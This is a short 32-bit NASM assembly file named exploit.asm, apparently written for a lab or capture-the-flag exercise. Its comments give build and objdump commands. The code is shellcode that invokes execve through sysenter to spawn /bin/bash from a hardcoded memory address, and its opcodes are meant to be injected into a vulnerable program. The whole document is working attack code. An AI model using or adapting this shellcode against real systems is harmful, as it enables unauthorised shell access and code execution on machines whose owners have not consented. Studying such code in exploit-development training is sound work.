; nasm -felf32 exploit.asm -o exploit.o
; gcc -Wall -Wextra -m32 exploit.o -no-pie -o a.out
; objdump exploit.o -d -Mi386

			global		main

			section		.text	
main:
			push		ecx	; setup for sysenter
			push		edx
			push		ebp
			mov			ebp, esp

			xor			eax, eax
			mov			al, 11 ; params and syscal number
			mov			ebx, 0x804a095	; /bin/bash
			xor			ecx, ecx
			xor			edx, edx
			sysenter
			ret
